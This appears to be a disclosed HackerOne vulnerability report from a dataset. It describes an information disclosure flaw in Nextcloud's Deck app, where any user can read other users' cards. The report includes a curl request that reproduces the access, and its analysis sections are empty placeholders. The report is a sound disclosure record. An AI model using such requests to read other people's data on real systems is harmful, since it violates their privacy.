---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1331728'
original_report_id: '1331728'
title: Cards in Deck are readable by any user
weakness: Information Disclosure
team_handle: nextcloud
created_at: '2021-09-07T11:21:19.308Z'
disclosed_at: '2023-03-26T16:03:04.254Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 24
asset_identifier: nextcloud/deck
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Cards in Deck are readable by any user

## Metadata

- HackerOne Report ID: 1331728
- Weakness: Information Disclosure
- Program: nextcloud
- Disclosed At: 2023-03-26T16:03:04.254Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Allows any user access to sensitive deck card contents.

## Steps To Reproduce:

  1. User creates a new "deck" and "stack".
  1. Create another user on your Nextcloud instance.
  1. curl -X GET -H "OCS-APIREQUEST: true" "http://localhost/index.php/apps/deck/api/v1.0/boards/1/stacks/1" -u hacker

As an output you get things like for example {title":"To do",,"cards":[{"title":"Example Task 3","}

## Impact

Allows any user access to sensitive deck card contents.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
